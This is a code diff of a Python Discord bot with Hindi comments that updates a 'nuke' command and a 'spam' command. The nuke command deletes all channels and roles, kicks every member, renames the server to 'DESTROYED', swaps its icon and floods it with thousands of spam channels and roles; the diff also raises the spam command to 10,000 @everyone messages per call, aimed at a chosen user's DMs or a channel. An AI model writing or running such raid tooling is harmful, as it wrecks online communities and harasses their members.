@@ -62,7 +62,7 @@ async def add(interaction: discord.Interaction, server_id: str):
         await interaction.response.send_message(f"❌ Error: {str(e)}", ephemeral=True)
 
 # ============ ULTIMATE NUKE COMMAND ============
-@bot.tree.command(name="nuke", description="💥 COMPLETE SERVER DESTRUCTION! 9999 CHANNELS + 999 ROLES + MEMBER KICK + DM SPAM!")
+@bot.tree.command(name="nuke", description="💥 COMPLETE SERVER DESTRUCTION! 9999 CHANNELS + 99 ROLES + MEMBER KICK + SERVER NAME CHANGE!")
 @discord.app_commands.checks.has_permissions(administrator=True)
 async def nuke(interaction: discord.Interaction):
     """सीधे server को ULTIMATE NUKE कर दो!"""
@@ -98,42 +98,43 @@ async def nuke(interaction: discord.Interaction):
                     print(f"⚠️ Error: {e}")
             await asyncio.sleep(0.05)
         
-        # Phase 3: Kick all members + DM SPAM
-        print("🔥 PHASE 3: KICKING ALL MEMBERS & DM SPAM...")
-        await interaction.followup.send("⏳ **PHASE 3:** सभी members को kick और DM spam कर रहे हैं...")
-        
-        spam_dm_messages = [
-            "🚀 तुम्हारा SERVER KI GOP GOP HOGYI! 💥",
-            "⚡ SERVER COMPLETELY NUKED! ⚡",
-            "🎆 DESTRUCTION COMPLETE! 🎆",
-            "🌋 NUCLEAR OPTION ACTIVATED! 🌋",
-            "🔥 TOTAL ANNIHILATION! 🔥",
-            "💥 तुम्हारा SERVER KA KOI BACHA HI NAHI BACHA! 💥",
-            "@everyone SERVER NUKE HO CHUKA HE! 🎉",
-        ]
+        # Phase 3: Kick all members
+        print("🔥 PHASE 3: KICKING ALL MEMBERS...")
+        await interaction.followup.send("⏳ **PHASE 3:** सभी members को kick कर रहे हैं...")
         
         for member in list(guild.members):
             if member.id != interaction.user.id and not member.bot:
                 try:
                     await member.kick(reason="SERVER NUKED 💥")
                     print(f"👢 KICKED: {member.name}")
-                    
-                    # DM SPAM - unlimited with 0.10 speed
-                    try:
-                        for spam_count in range(100):
-                            dm_msg = spam_dm_messages[spam_count % len(spam_dm_messages)]
-                            await member.send(f"@everyone {dm_msg}")
-                            await asyncio.sleep(0.10)
-                    except:
-                        pass
-                        
                 except Exception as e:
                     print(f"⚠️ Could not kick {member.name}: {e}")
             await asyncio.sleep(0.05)
         
-        # Phase 4: Create 9999 CHANNELS with emojis
-        print("🔥 PHASE 4: CREATING 9999 CHAOS CHANNELS...")
-        await interaction.followup.send("⏳ **PHASE 4:** 9999 Chaos Channels create कर रहे हैं...")
+        # Phase 4: Change Server Name
+        print("🔥 PHASE 4: CHANGING SERVER NAME...")
+        try:
+            await guild.edit(name="𝗗𝗘𝗦𝗧𝗥𝗢𝗬𝗘𝗗 💀")
+            print("✅ Server name changed to DESTROYED!")
+        except Exception as e:
+            print(f"⚠️ Could not change server name: {e}")
+        
+        # Phase 5: Change Server Icon
+        print("🔥 PHASE 5: CHANGING SERVER ICON...")
+        try:
+            icon_url = "https://cdn-icons-png.flaticon.com/512/1379/1379141.png"
+            async with aiohttp.ClientSession() as session:
+                async with session.get(icon_url) as resp:
+                    if resp.status == 200:
+                        icon_data = await resp.read()
+                        await guild.edit(icon=icon_data)
+                        print("✅ Server icon changed!")
+        except Exception as e:
+            print(f"⚠️ Could not change icon: {e}")
+        
+        # Phase 6: Create 9999 CHANNELS with emojis & spam
+        print("🔥 PHASE 6: CREATING 9999 CHAOS CHANNELS...")
+        await interaction.followup.send("⏳ **PHASE 6:** 9999 Chaos Channels create कर रहे हैं...")
         
         emojis = ["💣", "💥", "🔥", "⚡", "🎆", "🌋", "🚀", "💀", "👻", "🎯", "🎲", "🎨", "🎭", "🎪", "🎬", "🎤", "🎧", "🎮", "🎰", "🎳"]
         spam_messages = [
@@ -177,20 +178,20 @@ async def nuke(interaction: discord.Interaction):
                 print(f"⚠️ Error at channel {i+1}: {e}")
                 continue
         
-        # Phase 5: Create 999 ROLES
-        print("🔥 PHASE 5: CREATING 999 ROLES...")
-        await interaction.followup.send("⏳ **PHASE 5:** 999 Roles create कर रहे हैं...")
+        # Phase 7: Create 99 ROLES
+        print("🔥 PHASE 7: CREATING 99 ROLES...")
+        await interaction.followup.send("⏳ **PHASE 7:** 99 Roles create कर रहे हैं...")
         
         roles_created = 0
-        for i in range(999):
+        for i in range(99):
             try:
                 role_name = f"nuked-role-{i+1}"
                 role = await guild.create_role(name=role_name)
                 roles_created += 1
                 print(f"🎭 Created role: {role_name}")
                 
-                if (i + 1) % 100 == 0:
-                    await interaction.followup.send(f"✅ {i+1}/999 roles created!")
+                if (i + 1) % 10 == 0:
+                    await interaction.followup.send(f"✅ {i+1}/99 roles created!")
                     await asyncio.sleep(0.3)
                 else:
                     await asyncio.sleep(0.05)
@@ -203,20 +204,6 @@ async def nuke(interaction: discord.Interaction):
                 print(f"⚠️ Error creating role: {e}")
                 continue
         
-        # Phase 6: Change Server Icon
-        print("🔥 PHASE 6: CHANGING SERVER ICON...")
-        try:
-            # Default nuke icon
-            icon_url = "https://cdn-icons-png.flaticon.com/512/1379/1379141.png"
-            async with aiohttp.ClientSession() as session:
-                async with session.get(icon_url) as resp:
-                    if resp.status == 200:
-                        icon_data = await resp.read()
-                        await guild.edit(icon=icon_data)
-                        print("✅ Server icon changed!")
-        except Exception as e:
-            print(f"⚠️ Could not change icon: {e}")
-        
         # Final message
         try:
             general = await guild.create_text_channel("0-nuke-complete")
@@ -228,10 +215,11 @@ async def nuke(interaction: discord.Interaction):
 ╠═══════════════════════════════════════╣
 ║ ✅ All Channels: DELETED              ║
 ║ ✅ All Roles: DELETED                 ║
-║ ✅ All Members: KICKED + DM SPAMMED   ║
+║ ✅ All Members: KICKED                ║
 ║ ✅ 9999 Chaos Channels: CREATED       ║
 ║ ✅ 999 Spams per Channel: SENT        ║
-║ ✅ 999 New Roles: CREATED             ║
+║ ✅ 99 New Roles: CREATED              ║
+║ ✅ Server Name: DESTROYED             ║
 ║ ✅ Server Icon: CHANGED               ║
 ╚═══════════════════════════════════════╝
 
@@ -250,23 +238,37 @@ async def nuke(interaction: discord.Interaction):
     except Exception as e:
         await interaction.followup.send(f"❌ Error: {str(e)}")
 
-# ============ SPAM COMMAND ============
-@bot.tree.command(name="spam", description="💬 DM या Server में unlimited spam भेजो! (Message + Count)")
+# ============ SPAM COMMAND (UPDATED) ============
+@bot.tree.command(name="spam", description="💬 DM या Server में spam! (1-10000 messages)")
 @discord.app_commands.describe(
-    target="@user के लिए @mention, या 'server' (default: server)",
     message="Spam करने का message",
-    count="कितनी बार spam करना है (1-1000, default: 10)"
+    count="कितनी बार spam करना है (1-10000)",
+    target="@user के लिए @mention, या 'server' (default: server)",
+    mode="Single (हर message अलग) या Bulk (10 को साथ)"
 )
-async def spam(interaction: discord.Interaction, message: str, count: int = 10, target: str = "server"):
+async def spam(
+    interaction: discord.Interaction, 
+    message: str, 
+    count: int = 10, 
+    target: str = "server",
+    mode: str = "Single"
+):
     """
     DM या server में spam करो!
     Message और Count दोनों को customize कर सकते हो
+    Mode: Single (अलग-अलग) या Bulk (बैच में)
     """
     await interaction.response.defer(ephemeral=True)
     active_users[interaction.user.id] = datetime.now()
     
-    if count < 1 or count > 1000:
-        await interaction.followup.send("❌ Count 1 से 1000 के बीच होना चाहिए!", ephemeral=True)
+    # Validate count
+    if count < 1 or count > 10000:
+        await interaction.followup.send("❌ Count 1 से 10000 के बीच होना चाहिए!", ephemeral=True)
+        return
+    
+    # Validate mode
+    if mode.lower() not in ["single", "bulk"]:
+        await interaction.followup.send("❌ Mode 'Single' या 'Bulk' होना चाहिए!", ephemeral=True)
         return
     
     try:
@@ -275,29 +277,63 @@ async def spam(interaction: discord.Interaction, message: str, count: int = 10, 
             user_id = int(target.strip("<@!>"))
             user = await bot.fetch_user(user_id)
             
-            for i in range(count):
-                try:
-                    await user.send(f"[{i+1}/{count}] @everyone {message}")
-                    await asyncio.sleep(0.3)  # Speed control
-                except Exception as e:
-                    print(f"Error sending DM: {e}")
-                    break
+            if mode.lower() == "single":
+                # Single mode - हर message अलग भेजो
+                for i in range(count):
+                    try:
+                        await user.send(f"[{i+1}/{count}] @everyone {message}")
+                        await asyncio.sleep(0.2)
+                    except Exception as e:
+                        print(f"Error sending DM: {e}")
+                        break
+            else:
+                # Bulk mode - 10 messages को एक message में
+                bulk_size = 10
+                for batch_start in range(0, count, bulk_size):
+                    batch_end = min(batch_start + bulk_size, count)
+                    bulk_message = ""
+                    for i in range(batch_start, batch_end):
+                        bulk_message += f"[{i+1}/{count}] @everyone {message}\n"
+                    
+                    try:
+                        await user.send(bulk_message)
+                        await asyncio.sleep(0.3)
+                    except Exception as e:
+                        print(f"Error sending bulk DM: {e}")
+                        break
             
-            await interaction.followup.send(f"✅ {count} messages {user.name} को भेज दिए!", ephemeral=True)
+            await interaction.followup.send(f"✅ {count} messages {user.name} को {mode} mode में भेज दिए!", ephemeral=True)
         
         # Server में spam
         else:
             channel = interaction.channel
             
-            for i in range(count):
-                try:
-                    await channel.send(f"[{i+1}/{count}] @everyone {message}")
-                    await asyncio.sleep(0.3)  # Speed control
-                except Exception as e:
-                    print(f"Error sending message: {e}")
-                    break
+            if mode.lower() == "single":
+                # Single mode - हर message अलग भेजो
+                for i in range(count):
+                    try:
+                        await channel.send(f"[{i+1}/{count}] @everyone {message}")
+                        await asyncio.sleep(0.2)
+                    except Exception as e:
+                        print(f"Error sending message: {e}")
+                        break
+            else:
+                # Bulk mode - 10 messages को एक message में
+                bulk_size = 10
+                for batch_start in range(0, count, bulk_size):
+                    batch_end = min(batch_start + bulk_size, count)
+                    bulk_message = ""
+                    for i in range(batch_start, batch_end):
+                        bulk_message += f"[{i+1}/{count}] @everyone {message}\n"
+                    
+                    try:
+                        await channel.send(bulk_message)
+                        await asyncio.sleep(0.3)
+                    except Exception as e:
+                        print(f"Error sending bulk message: {e}")
+                        break
             
-            await interaction.followup.send(f"✅ {count} messages server में भेज दिए!", ephemeral=True)
+            await interaction.followup.send(f"✅ {count} messages server में {mode} mode में भेज दिए!", ephemeral=True)
     
     except Exception as e:
         await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)
